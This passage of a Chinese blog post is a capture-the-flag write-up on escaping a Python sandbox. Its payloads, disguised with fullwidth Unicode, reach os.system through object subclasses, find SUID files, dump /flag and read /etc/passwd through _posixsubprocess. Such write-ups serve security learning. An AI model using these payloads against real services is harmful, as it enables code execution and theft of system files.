+<p>像’这种的用’或＇都行，但_#=等还是用‗＃＝等，不是都全角的。。。有的不能如法炮制，这么看来还是用一开始的最合理。（到底是一个一个找出来的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/2848488d570159a7a9301f14de745a3f.png"></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">{</span><span class="token string">"blocks"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"blocks"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"type"</span><span class="token punctuation">:</span><span class="token string">"text"</span><span class="token punctuation">,</span><span class="token string">"fields"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"TEXT"</span><span class="token punctuation">:</span><span class="token string">"1＇；‗‗builtins‗‗․len＝lambda x∶ 3；‗‗import‗‗（＂os＂）․system（＂whoami＂）；＃"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span>                             <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/d4b80e3079a03088728b5608083ca5ab.png"></p>
+<p>okk</p>
+<p>再照抄SSTIpayload即可</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span> x<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__ <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x<span class="token punctuation">.</span>__name__<span class="token operator">==</span><span class="token string">"_wrap_close"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span>
+<span class="token comment">#首先，''.__class__.__base__ 会获取到 object 类，因为空字符串 '' 所属的类是 str，而 str 的基类是 object。接着，使用 __subclasses__() 方法获取 object 类的所有直接子类列表。之后，通过列表推导式筛选出类名为 _wrap_close 的类。再获取该类构造函数 __init__ 的全局命名空间 __globals__，从中找到 system 函数（一般是 os.system），最后调用该函数执行 ls 命令。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">{</span><span class="token string">"blocks"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"blocks"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"type"</span><span class="token punctuation">:</span><span class="token string">"text"</span><span class="token punctuation">,</span><span class="token string">"fields"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"TEXT"</span><span class="token punctuation">:</span><span class="token string">"1＇；‗‗builtins‗‗․len＝lambda x∶ 3；［ x․‗‗init‗‗․‗‗globals‗‗ for x in ＇＇․‗‗class‗‗․‗‗base‗‗․‗‗subclasses‗‗（） if x․‗‗name‗‗＝＝＂‗wrap‗close＂］［0］［＂system＂］（＂ls＂）＃"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>用这个也行</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"builtins"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">len</span><span class="token operator">=</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token comment">#__import__("os") 动态导入 os 模块，这是 Python 中用于与操作系统进行交互的标准模块。然后调用 os 模块的 system 函数，将字符串 "ls" 作为参数传入，从而执行系统的 ls 命令（在 Unix/Linux 系统中用于列出目录内容）。最后使用 print 函数输出 os.system 函数的返回值，该返回值通常是命令执行后的返回码。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/073dfe1b9ad1158033ab6f27c110ef5f.png"></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">{</span><span class="token string">"blocks"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"blocks"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"type"</span><span class="token punctuation">:</span><span class="token string">"text"</span><span class="token punctuation">,</span><span class="token string">"fields"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"TEXT"</span><span class="token punctuation">:</span><span class="token string">"1＇；‗‗builtins‗‗․len＝lambda x∶ 3；［ x․‗‗init‗‗․‗‗globals‗‗ for x in ＇＇․‗‗class‗‗․‗‗base‗‗․‗‗subclasses‗‗（） if x․‗‗name‗‗＝＝＂‗wrap‗close＂］［0］［＂system＂］（＂ls ╱ ‐al＂）＃"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span>     <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/7bf577e7c6a076aba9f0d0fd5bdf095b.png"></p>
+<blockquote>
+<pre class="line-numbers language-none"><code class="language-none">在使用 ls -l 命令列出文件和目录详细信息时，会看到类似下面的输出：
+-rwxr-xr-- 1 user group 1024 Jan 1 12:00 example.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>这里 <code>-rwxr-xr--</code> 就是权限信息，其具体含义为：</p>
+<ul>
+<li>第一个字符表示文件类型，<code>-</code> 表示普通文件，<code>d</code> 表示目录，<code>l</code> 表示符号链接等。</li>
+<li>接下来三个字符 <code>rwx</code> 是文件所有者（user）的权限，这里表示所有者具有读、写和执行权限。</li>
+<li>再接下来三个字符 <code>r-x</code> 是文件所属组（group）的权限，即所属组用户有读和执行权限，但没有写入权限。</li>
+<li>最后三个字符 <code>r--</code> 是其他用户（others）的权限，意味着其他用户只有读取权限。</li>
+</ul>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LINGX5/p/18387520">https://www.cnblogs.com/LINGX5/p/18387520</a></p>
+<p>当然我肯定有权限（</p>
+<p><del>就当我没权限（</del></p>
+<blockquote>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-type</span> f <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ul>
+<li>命令解释：<ul>
+<li><code>find</code>：这是用于在文件系统中搜索文件的命令。</li>
+<li><code>/</code>：表示从根目录开始搜索。</li>
+<li><code>-type f</code>：指定只搜索普通文件。</li>
+<li><code>-perm -4000</code>：用于查找具有 SUID 权限的文件，<code>4000</code> 是 SUID 权限的八进制表示。</li>
+<li><code>2&gt;/dev/null</code>：将错误输出重定向到 <code>/dev/null</code>，这样可以忽略因权限不足而产生的错误信息。</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">{</span><span class="token string">"blocks"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"blocks"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"type"</span><span class="token punctuation">:</span><span class="token string">"text"</span><span class="token punctuation">,</span><span class="token string">"fields"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"TEXT"</span><span class="token punctuation">:</span><span class="token string">"1＇；‗‗builtins‗‗․len＝lambda x∶ 3；［ x․‗‗init‗‗․‗‗globals‗‗ for x in ＇＇․‗‗class‗‗․‗‗base‗‗․‗‗subclasses‗‗（） if x․‗‗name‗‗＝＝＂‗wrap‗close＂］［0］［＂system＂］（＂find ╱ ‐type f ‐perm ‐4000 2˃╱dev╱null＂）＃"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<blockquote>
+<p><code>dd</code> 是一个在类 Unix 系统中用于复制文件并对原文件的内容进行转换和格式化处理的命令。其基本语法为 <code>dd [选项]</code>，常见的选项有 <code>if</code>（输入文件）、<code>of</code>（输出文件）等。</p>
+</blockquote>
+<p><del>很可惜我看了看我没用过dd（</del></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">dd <span class="token keyword">if</span><span class="token operator">=</span><span class="token operator">/</span>flag of<span class="token operator">=</span><span class="token operator">/</span>dev<span class="token operator">/</span>stdout
+<span class="token comment">#if=/flag：if 是 input file 的缩写，此参数指定了输入文件的路径。在这个命令里，输入文件为 /flag，意味着 dd 命令会从 /flag 文件中读取数据。</span>
+<span class="token comment">#of=/dev/stdout：of 是 output file 的缩写，该参数指定了输出文件的路径。/dev/stdout 代表标准输出，也就是命令执行时，读取自 /flag 文件的数据会被输出到终端显示。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>再把它塞到TEXT里就可了~（</p>
+<p>另一种是用同是文中的_posixsubprocess 执行命令</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">{</span><span class="token string">"blocks"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"blocks"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"type"</span><span class="token punctuation">:</span><span class="token string">"text"</span><span class="token punctuation">,</span><span class="token string">"fields"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"TEXT"</span><span class="token punctuation">:</span><span class="token string">"1＇；print（（）․‗‗class‗‗․‗‗base‗‗․‗‗subclasses‗‗（））＃"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>爆了一堆。。。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re
+
+data<span class="token operator">=</span><span class="token triple-quoted-string string">'''[&lt;class 'type'&gt;, &lt;class 'async_generator'&gt;, &lt;class 'bytearray_iterator'&gt;, &lt;class 'bytearray'&gt;, &lt;class 'bytes_iterator'&gt;, &lt;class 'bytes'&gt;, &lt;class 'builtin_function_or_method'&gt;, &lt;class 'callable_iterator'&gt;, &lt;class 'PyCapsule'&gt;, &lt;class 'cell'&gt;, &lt;class 'classmethod_descriptor'&gt;, &lt;class 'classmethod'&gt;, &lt;class 'code'&gt;, &lt;class 'complex'&gt;, &lt;class '_contextvars.Token'&gt;, &lt;class '_contextvars.ContextVar'&gt;, &lt;class '_contextvars.Context'&gt;, &lt;class 'coroutine'&gt;, &lt;class 'dict_items'&gt;, &lt;class 'dict_itemiterator'&gt;, &lt;class 'dict_keyiterator'&gt;, &lt;class 'dict_valueiterator'&gt;, &lt;class 'dict_keys'&gt;, &lt;class 'mappingproxy'&gt;, &lt;class 'dict_reverseitemiterator'&gt;, &lt;class 'dict_reversekeyiterator'&gt;, &lt;class 'dict_reversevalueiterator'&gt;, &lt;class 'dict_values'&gt;, &lt;class 'dict'&gt;, &lt;class 'ellipsis'&gt;, &lt;class 'enumerate'&gt;, &lt;class 'filter'&gt;, &lt;class 'float'&gt;, &lt;class 'frame'&gt;, &lt;class 'frozenset'&gt;, &lt;class 'function'&gt;, &lt;class 'generator'&gt;, &lt;class 'getset_descriptor'&gt;, &lt;class 'instancemethod'&gt;, &lt;class 'list_iterator'&gt;, &lt;class 'list_reverseiterator'&gt;, &lt;class 'list'&gt;, &lt;class 'longrange_iterator'&gt;, &lt;class 'int'&gt;, &lt;class 'map'&gt;, &lt;class 'member_descriptor'&gt;, &lt;class 'memoryview'&gt;, &lt;class 'method_descriptor'&gt;, &lt;class 'method'&gt;, &lt;class 'moduledef'&gt;, &lt;class 'module'&gt;, &lt;class 'odict_iterator'&gt;, &lt;class 'pickle.PickleBuffer'&gt;, &lt;class 'property'&gt;, &lt;class 'range_iterator'&gt;, &lt;class 'range'&gt;, &lt;class 'reversed'&gt;, &lt;class 'symtable entry'&gt;, &lt;class 'iterator'&gt;, &lt;class 'set_iterator'&gt;, &lt;class 'set'&gt;, &lt;class 'slice'&gt;, &lt;class 'staticmethod'&gt;, &lt;class 'stderrprinter'&gt;, &lt;class 'super'&gt;, &lt;class 'traceback'&gt;, &lt;class 'tuple_iterator'&gt;, &lt;class 'tuple'&gt;, &lt;class 'str_iterator'&gt;, &lt;class 'str'&gt;, &lt;class 'wrapper_descriptor'&gt;, &lt;class 'zip'&gt;, &lt;class 'types.GenericAlias'&gt;, &lt;class 'anext_awaitable'&gt;, &lt;class 'async_generator_asend'&gt;, &lt;class 'async_generator_athrow'&gt;, &lt;class 'async_generator_wrapped_value'&gt;, &lt;class '_buffer_wrapper'&gt;, &lt;class 'Token.MISSING'&gt;, &lt;class 'coroutine_wrapper'&gt;, &lt;class 'generic_alias_iterator'&gt;, &lt;class 'items'&gt;, &lt;class 'keys'&gt;, &lt;class 'values'&gt;, &lt;class 'hamt_array_node'&gt;, &lt;class 'hamt_bitmap_node'&gt;, &lt;class 'hamt_collision_node'&gt;, &lt;class 'hamt'&gt;, &lt;class 'sys.legacy_event_handler'&gt;, &lt;class 'InterpreterID'&gt;, &lt;class 'line_iterator'&gt;, &lt;class 'managedbuffer'&gt;, &lt;class 'memory_iterator'&gt;, &lt;class 'method-wrapper'&gt;, &lt;class 'types.SimpleNamespace'&gt;, &lt;class 'NoneType'&gt;, &lt;class 'NotImplementedType'&gt;, &lt;class 'positions_iterator'&gt;, &lt;class 'str_ascii_iterator'&gt;, &lt;class 'types.UnionType'&gt;, &lt;class 'weakref.CallableProxyType'&gt;, &lt;class 'weakref.ProxyType'&gt;, &lt;class 'weakref.ReferenceType'&gt;, &lt;class 'typing.TypeAliasType'&gt;, &lt;class 'typing.Generic'&gt;, &lt;class 'typing.TypeVar'&gt;, &lt;class 'typing.TypeVarTuple'&gt;, &lt;class 'typing.ParamSpec'&gt;, &lt;class 'typing.ParamSpecArgs'&gt;, &lt;class 'typing.ParamSpecKwargs'&gt;, &lt;class 'EncodingMap'&gt;, &lt;class 'fieldnameiterator'&gt;, &lt;class 'formatteriterator'&gt;, &lt;class 'BaseException'&gt;, &lt;class '_frozen_importlib._WeakValueDictionary'&gt;, &lt;class '_frozen_importlib._BlockingOnManager'&gt;, &lt;class '_frozen_importlib._ModuleLock'&gt;, &lt;class '_frozen_importlib._DummyModuleLock'&gt;, &lt;class '_frozen_importlib._ModuleLockManager'&gt;, &lt;class '_frozen_importlib.ModuleSpec'&gt;, &lt;class '_frozen_importlib.BuiltinImporter'&gt;, &lt;class '_frozen_importlib.FrozenImporter'&gt;, &lt;class '_frozen_importlib._ImportLockContext'&gt;, &lt;class '_thread.lock'&gt;, &lt;class '_thread.RLock'&gt;, &lt;class '_thread._localdummy'&gt;, &lt;class '_thread._local'&gt;, &lt;class '_io.IncrementalNewlineDecoder'&gt;, &lt;class '_io._BytesIOBuffer'&gt;, &lt;class '_io._IOBase'&gt;, &lt;class 'posix.ScandirIterator'&gt;, &lt;class 'posix.DirEntry'&gt;, &lt;class '_frozen_importlib_external.WindowsRegistryFinder'&gt;, &lt;class '_frozen_importlib_external._LoaderBasics'&gt;, &lt;class '_frozen_importlib_external.FileLoader'&gt;, &lt;class '_frozen_importlib_external._NamespacePath'&gt;, &lt;class '_frozen_importlib_external.NamespaceLoader'&gt;, &lt;class '_frozen_importlib_external.PathFinder'&gt;, &lt;class '_frozen_importlib_external.FileFinder'&gt;, &lt;class 'codecs.Codec'&gt;, &lt;class 'codecs.IncrementalEncoder'&gt;, &lt;class 'codecs.IncrementalDecoder'&gt;, &lt;class 'codecs.StreamReaderWriter'&gt;, &lt;class 'codecs.StreamRecoder'&gt;, &lt;class '_abc._abc_data'&gt;, &lt;class 'abc.ABC'&gt;, &lt;class 'collections.abc.Hashable'&gt;, &lt;class 'collections.abc.Awaitable'&gt;, &lt;class 'collections.abc.AsyncIterable'&gt;, &lt;class 'collections.abc.Iterable'&gt;, &lt;class 'collections.abc.Sized'&gt;, &lt;class 'collections.abc.Container'&gt;, &lt;class 'collections.abc.Buffer'&gt;, &lt;class 'collections.abc.Callable'&gt;, &lt;class 'os._wrap_close'&gt;, &lt;class '_sitebuiltins.Quitter'&gt;, &lt;class '_sitebuiltins._Printer'&gt;, &lt;class '_sitebuiltins._Helper'&gt;, &lt;class 'types._C'&gt;, &lt;class 'types.DynamicClassAttribute'&gt;, &lt;class 'types._GeneratorWrapper'&gt;, &lt;class 'warnings.WarningMessage'&gt;, &lt;class 'warnings.catch_warnings'&gt;, &lt;class 'importlib._abc.Loader'&gt;, &lt;class 'importlib.util._incompatible_extension_module_restrictions'&gt;, &lt;class '_distutils_hack._TrivialRe'&gt;, &lt;class '_distutils_hack.DistutilsMetaFinder'&gt;, &lt;class '_distutils_hack.shim'&gt;]'''</span>
+
+data <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&lt;'</span><span class="token punctuation">,</span><span class="token string">'&lt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&gt;'</span><span class="token punctuation">,</span><span class="token string">"&gt;"</span><span class="token punctuation">)</span>
+userful_class <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">,</span><span class="token string">'site._Printer'</span><span class="token punctuation">,</span><span class="token string">'linecache'</span><span class="token punctuation">,</span> <span class="token string">'_frozen_importlib.BuiltinImporter'</span><span class="token punctuation">,</span><span class="token string">'os._wrap_close'</span><span class="token punctuation">,</span> <span class="token string">'subprocess.Popen'</span><span class="token punctuation">,</span> <span class="token string">'warnings.catch_warnings'</span><span class="token punctuation">,</span> <span class="token string">'_frozen_importlib._ModuleLock'</span><span class="token punctuation">,</span> <span class="token string">'_frozen_importlib._DummyModuleLock'</span><span class="token punctuation">,</span> <span class="token string">'_frozen_importlib._ModuleLockManager'</span><span class="token punctuation">,</span> <span class="token string">'_frozen_importlib.ModuleSpec'</span><span class="token punctuation">]</span>
+
+pattern <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r"'(.*?)'"</span><span class="token punctuation">)</span>
+class_list <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
+<span class="token keyword">for</span> c <span class="token keyword">in</span> class_list<span class="token punctuation">:</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> userful_class<span class="token punctuation">:</span>
+        <span class="token keyword">if</span> i <span class="token keyword">in</span> c<span class="token punctuation">:</span>
+            index <span class="token operator">=</span> class_list<span class="token punctuation">.</span>index<span class="token punctuation">(</span>c<span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">": "</span> <span class="token operator">+</span> c<span class="token punctuation">)</span>
+
+ 
+<span class="token comment">#一个筛选的脚本</span>
+<span class="token triple-quoted-string string">'''116: _frozen_importlib._ModuleLock
+117: _frozen_importlib._DummyModuleLock
+118: _frozen_importlib._ModuleLockManager
+118: _frozen_importlib._ModuleLockManager
+119: _frozen_importlib.ModuleSpec
+120: _frozen_importlib.BuiltinImporter
+154: os._wrap_close
+162: warnings.catch_warnings'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token number">1</span><span class="token string">';import_ = ().__class__.__base__.__subclasses__()[120].load_module;_posixsubprocess = import_("_posixsubprocess");pipe = ().__class__.__base__.__subclasses__()[154].__init__.__globals__['</span>pipe'<span class="token punctuation">]</span><span class="token punctuation">;</span>_posixsubprocess<span class="token punctuation">.</span>fork_exec<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">b"/bin/cat"</span><span class="token punctuation">,</span><span class="token string">b"/etc/passwd"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">b"/bin/cat"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>pipe<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>先酱吧，有缘再补</p>
+<hr>
+<p>可以我去搞一个dd然后再完善一些再试一遍，稍等<del>（但是好懒。。。有缘再说吧</del></p>
+<hr>
+<p>好像有两次，本次必做是否该叫unidecode专题（指指点点</p>
+<p>还有两道以前发过</p>
+<p>还是先把必做的发了吧<a target="_blank" rel="noopener" href="https://qing777.pythonanywhere.com/%EF%BC%8C%E6%97%A0%E4%BA%8B%E4%B8%80%E8%BA%AB%E8%BD%BB%EF%BC%8C%E5%85%B6%E4%BB%96%E7%9A%84%E5%86%8D%E8%AF%B4%E5%90%A7%E3%80%82">https://qing777.pythonanywhere.com/，无事一身轻，其他的再说吧。</a></p>
+<hr>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">q1n9</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://lingqing777.github.io/2025/02/12/2-yue-5-ri/">https://lingqing777.github.io/2025/02/12/2-yue-5-ri/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">q1n9</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/ctf/">
+                                    <span class="chip bg-color">ctf</span>
+                                </a>
+                            
+                                <a href="/tags/wp/">
+                                    <span class="chip bg-color">wp</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2025/02/13/pwncat/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="一些其他的">
+                        
+                        <span class="card-title">一些其他的</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2025-02-13
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E7%BD%91%E5%AE%89/" class="post-category">
+                                    网安
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%9D%82/">
+                        <span class="chip bg-color">杂</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2025/01/25/di-yi-ye/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="buuctf">
+                        
+                        <span class="card-title">buuctf</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-01-25
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E7%BD%91%E5%AE%89/" class="post-category">
+                                    网安
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctf/">
+                        <span class="chip bg-color">ctf</span>
+                    </a>
+                    
+                    <a href="/tags/wp/">
+                        <span class="chip bg-color">wp</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
